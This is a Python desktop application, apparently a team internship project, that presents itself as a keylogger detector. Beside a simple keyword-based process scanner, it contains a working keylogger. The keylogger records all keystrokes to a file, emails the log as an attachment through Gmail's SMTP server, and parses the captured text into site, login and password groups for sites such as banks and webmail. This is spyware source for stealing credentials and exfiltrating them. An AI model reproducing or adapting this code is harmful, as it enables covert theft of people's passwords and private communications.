import os
import psutil
import time
import ctypes
import tkinter as tk
from tkinter import ttk, messagebox
from threading import Thread
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import webbrowser
import tempfile
from datetime import datetime

# =========================
# === PROJECT INFO ========
# =========================

PROJECT_NAME = "KEYLOGGER_ANALYZER"
PROJECT_DESC = (
    "Detecting keyloggers by monitoring unusual keystroke logging behaviors, "
    "unauthorized access to input devices, and suspicious background processes."
)
PROJECT_START_DATE = "14-June-2025"
PROJECT_END_DATE = "14-July-2025"
PROJECT_STATUS = "Completed"

TEAM_MEMBERS = ["BHOOMIKA", "SAKSHI", "ANJALI", "SWETHA"]
EMPLOYEE_IDS = ["ST#IS#7528", "ST#IS#7538", "ST#IS#7540", "ST#IS#7543"]
TEAM_EMAIL = "team66keylogger@example.com"
COMPANY_NAME = "Supraja Technologies"
COMPANY_EMAIL = "contact@suprajatechnologies.com"

# =======================
# === CONFIGURATION =====
# =======================
SCAN_INTERVAL = 5
SUSPICIOUS_KEYWORDS = ["keylogger", "hook", "pyhook", "logger"]

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def scan_processes():
    suspicious = []
    for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
        try:
            cmdline = proc.info.get("cmdline") or []
            full_cmd = " ".join(cmdline)
            combined = (proc.info.get("name") or "") + " " + full_cmd
            for keyword in SUSPICIOUS_KEYWORDS:
                if keyword.lower() in combined.lower():
                    suspicious.append(proc.info)
                    break
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return suspicious

def kill_process(pid):
    try:
        psutil.Process(pid).terminate()
        return True
    except Exception as e:
        print(f"[!] Error killing process {pid}: {e}")
        return False

class KeyloggerDetectorApp:
    def __init__(self, root):  # <-- fixed constructor
        self.root = root
        self.root.title("VKDDS - Keylogger Detection & Recorder (Enhanced)")
        self.keylogger_running = False
        self.log_file = "keylog.txt"

        self.tab_control = ttk.Notebook(root)
        self.tab_info = ttk.Frame(self.tab_control)
        self.tab1 = ttk.Frame(self.tab_control)
        self.tab2 = ttk.Frame(self.tab_control)
        self.tab3 = ttk.Frame(self.tab_control)

        self.tab_control.add(self.tab_info, text='Project Info')
        self.tab_control.add(self.tab1, text='Detection Dashboard')
        self.tab_control.add(self.tab2, text='Keylogger Recorder')
        self.tab_control.add(self.tab3, text='Categorized Data')
        self.tab_control.pack(expand=1, fill='both')

        self.create_project_info_tab()
        self.create_detection_dashboard()
        self.create_keylogger_recorder()
        self.create_categorized_data_tab()

        self.start_process_scan()

    def create_project_info_tab(self):
        tk.Button(
            self.tab_info, text="Project Info",
            command=self.show_project_info_in_browser,
            font=("Consolas", 11), width=30, height=2
        ).pack(pady=40)

    def show_project_info_in_browser(self):
        members_html = "".join(f"<li>{name}</li>" for name in TEAM_MEMBERS)
        employee_ids_html = "".join(f"<li>{eid}</li>" for eid in EMPLOYEE_IDS)
        html_content = f"""
<!DOCTYPE html>
<html>
<head><title>{PROJECT_NAME}</title></head>
<body>
<h2>{PROJECT_NAME}</h2>
<p><b>Description:</b> {PROJECT_DESC}</p>
<p><b>Start Date:</b> {PROJECT_START_DATE} <b>End Date:</b> {PROJECT_END_DATE}</p>
<p><b>Status:</b> {PROJECT_STATUS}</p>
<h3>Team</h3>
<ul>{members_html}</ul>
<h3>Employee IDs</h3>
<ul>{employee_ids_html}</ul>
<p><b>Email:</b> {TEAM_EMAIL}</p>
<p><b>Company:</b> {COMPANY_NAME} | <b>Email:</b> {COMPANY_EMAIL}</p>
</body></html>
        """
        with tempfile.NamedTemporaryFile('w', delete=False, suffix='.html', encoding='utf-8') as f:
            f.write(html_content)
            path = f.name
        webbrowser.open('file://' + path)

    def create_detection_dashboard(self):
        self.tree = ttk.Treeview(self.tab1, columns=("pid", "name", "exe", "cmdline"), show="headings")
        for col in self.tree['columns']:
            self.tree.heading(col, text=col.upper())
        self.tree.pack(expand=1, fill='both')
        tk.Button(self.tab1, text="Kill Selected Process", command=self.kill_selected_process).pack(pady=5)

    def create_keylogger_recorder(self):
        self.log_text = tk.Text(self.tab2, wrap=tk.WORD, height=20)
        self.log_text.pack(expand=1, fill='both')
        btn_frame = tk.Frame(self.tab2)
        btn_frame.pack(pady=5)
        tk.Button(btn_frame, text="Start Keylogger", command=self.start_keylogger_thread).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Save Log to File", command=self.save_log).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Send Email", command=self.send_email).pack(side=tk.LEFT, padx=5)

    def create_categorized_data_tab(self):
        self.data_tree = ttk.Treeview(self.tab3, columns=("Category", "data"), show="headings")
        self.data_tree.heading("Category", text="Category")
        self.data_tree.heading("data", text="data")
        self.data_tree.pack(expand=1, fill='both')
        tk.Button(self.tab3, text="Load Categorized Data", command=self.load_categorized_data).pack(pady=5)

    def start_process_scan(self):
        def scan_loop():
            while True:
                processes = scan_processes()
                self.update_process_table(processes)
                time.sleep(SCAN_INTERVAL)
        t = Thread(target=scan_loop, daemon=True)
        t.start()

    def update_process_table(self, processes):
        for row in self.tree.get_children():
            self.tree.delete(row)
        for proc in processes:
            self.tree.insert("", "end", values=(proc['pid'], proc['name'], proc.get('exe', ''), ' '.join(proc.get('cmdline', []))))

    def kill_selected_process(self):
        selected = self.tree.focus()
        if not selected:
            return
        pid = self.tree.item(selected)['values'][0]
        if kill_process(pid):
            messagebox.showinfo("Process Killed", f"Terminated PID: {pid}")

    def start_keylogger_thread(self):
        if self.keylogger_running:
            return
        self.keylogger_running = True
        suspicious = scan_processes()
        if suspicious:
            messagebox.showwarning("Suspicious", "Keylogger Activity Detected!")
        Thread(target=self.start_keylogger, daemon=True).start()

    def start_keylogger(self):
        def on_press(key):
            if not self.keylogger_running:
                return False
            try:
                k = key.char
            except AttributeError:
                k = str(key)
            if k.startswith("Key.") and k != "Key.space":
                return
            if k == "Key.space":
                k = " "
            timestamp = datetime.now().strftime("[%H:%M:%S]")
            entry = f"{timestamp} {k}\n"
            self.log_text.insert(tk.END, entry)
            self.log_text.see(tk.END)
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(entry)
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def save_log(self):
        try:
            with open(self.log_file, "r", encoding="utf-8") as f:
                content = f.read()
            with open("saved_keylog.txt", "w", encoding="utf-8") as f:
                f.write(content)
            self.log_text.insert(tk.END, "\n[✓] Log saved to 'saved_keylog.txt'\n")
        except Exception as e:
            self.log_text.insert(tk.END, f"\n[!] Error saving log: {e}\n")

    def send_email(self):
        try:
            email = "your_email@example.com"
            password = "your_password"
            recipient = "recipient@example.com"
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = recipient
            msg['Subject'] = "Keylog Report"
            msg.attach(MIMEText("See attached keylogger report.", 'plain'))

            filename = "saved_keylog.txt"
            with open(filename, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={filename}")
                msg.attach(part)

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, recipient, msg.as_string())
            server.quit()

            messagebox.showinfo("Email", "Keylog sent successfully.")
        except Exception as e:
            messagebox.showerror("Email Error", f"Error sending email: {e}")

    def load_categorized_data(self):
        file_path = "saved_keylog.txt"
        self.data_tree.delete(*self.data_tree.get_children())

        if not os.path.exists(file_path):
            messagebox.showwarning("Warning", "No keylog file found!")
            return

        entries = []
        temp_text = ""
        prev_time = None

        try:
            with open(file_path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line.startswith("[") or "]" not in line:
                        continue
                    try:
                        time_str = line.split("]")[0].strip("[")
                        char = line.split("]")[1].strip()
                        curr_time = datetime.strptime(time_str, "%H:%M:%S")
                        if prev_time:
                            delta = (curr_time - prev_time).total_seconds()
                            if delta > 2:
                                if temp_text:
                                    entries.append(temp_text.strip())
                                    temp_text = ""
                        prev_time = curr_time
                        temp_text += char
                    except:
                        continue
            if temp_text:
                entries.append(temp_text.strip())

            grouped = []
            misc = []
            i = 0
            while i < len(entries) - 2:
                site = entries[i].lower()
                if any(x in site for x in ["gmail", "facebook", "login", ".com", "outlook", "bank"]):
                    grouped.append((entries[i], entries[i+1], entries[i+2]))
                    i += 3
                else:
                    misc.append(entries[i])
                    i += 1
            for j in range(i, len(entries)):
                misc.append(entries[j])

            if grouped:
                self.data_tree.insert("", "end", values=("-- Sites & Logins --", "", ""))
                for g in grouped:
                    self.data_tree.insert("", "end", values=g)
            else:
                self.data_tree.insert("", "end", values=("No login data found", "", ""))

            if misc:
                self.data_tree.insert("", "end", values=("-- Conversations / Misc --", "", ""))
                for line in misc[:20]:
                    self.data_tree.insert("", "end", values=("", line, ""))

        except Exception as e:
            messagebox.showerror("Error", f"Failed to load data: {e}")

# Entry Point
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerDetectorApp(root)
    root.mainloop()
